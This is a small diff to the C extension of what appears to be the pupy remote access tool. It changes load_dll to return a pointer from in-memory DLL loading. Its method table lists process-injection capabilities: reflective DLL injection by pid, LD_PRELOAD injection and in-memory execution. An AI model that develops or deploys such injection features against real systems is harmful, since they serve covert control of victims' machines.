@@ -221,9 +221,7 @@ static PyObject *Py_load_dll(PyObject *self, PyObject *args)
 
     printf("Py_load_dll(%s)\n", dllname);
 
-    if(memdlopen(dllname, lpDllBuffer, dwDllLenght))
-        return PyBool_FromLong(1);
-    return PyBool_FromLong(0);
+    return PyLong_FromVoidPtr(memdlopen(dllname, lpDllBuffer, dwDllLenght));
 }
 
 static PyObject *Py_mexec(PyObject *self, PyObject *args)
@@ -290,7 +288,7 @@ static PyMethodDef methods[] = {
     { "get_arch", Py_get_arch, METH_NOARGS, "get current pupy architecture (x86 or x64)" },
     { "get_modules", Py_get_modules, METH_NOARGS, "get pupy library" },
     { "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, "reflective_inject_dll(pid, dll_buffer)\nreflectively inject a dll into a process. raise an Exception on failure" },
-    { "load_dll", Py_load_dll, METH_VARARGS, "load_dll(dllname, raw_dll) -> bool" },
+    { "load_dll", Py_load_dll, METH_VARARGS, "load_dll(dllname, raw_dll) -> ptr" },
     { "mexec", Py_mexec, METH_VARARGS, "mexec(data, argv, redirected_stdio, detach) -> (pid, (in, out, err))" },
     { "ld_preload_inject_dll", Py_ld_preload_inject_dll, METH_VARARGS, "ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid" },
     { NULL, NULL },     /* Sentinel */
